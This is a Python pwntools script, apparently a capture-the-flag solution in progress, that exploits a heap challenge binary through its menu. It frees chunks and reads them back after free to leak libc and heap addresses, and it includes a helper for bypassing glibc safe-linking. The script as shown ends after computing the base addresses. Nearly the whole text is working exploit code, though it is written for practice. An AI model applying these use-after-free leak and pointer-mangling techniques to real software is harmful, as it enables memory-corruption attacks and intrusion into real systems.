from pwn import *

p = process('./chal')
libc = ELF('./libc.so.6')
context.log_level='debug'

def protect(pos, ptr):
    return (pos >> 12) ^ ptr

def allocate(idx, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.sendlineafter(b"size?: ", str(size).encode())
    p.sendlineafter(b"data?: ", data)
def view(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.recvuntil(b"meow: ")
    leak_data = p.recvuntil(b"1. ")[:-3]
    if len(leak_data) > 8:
        leak_data = leak_data[:8]
    return u64(leak_data.ljust(8, b"\x00"))
def dele(idx): 
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx?: ", str(idx).encode())

def edit(idx, data): 
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.sendlineafter(b"new data?: ", data)

allocate(0, 0x500, b"A")
allocate(1, 0x200, b"B")
dele(0)
dele(1)
libc_val = view(0)
heap_val = view(1)
log.info(f"Unsorted Bin Leak: {hex(libc_val)}")

offset = 0x7ffff7fafb20 - 0x7ffff7d9e000
libc_base = libc_val - offset
heap_base = heap_val << 12
log.info(f"Libc Base: {hex(libc_base)}")
log.info(f"Heap Base: {hex(heap_base)}")



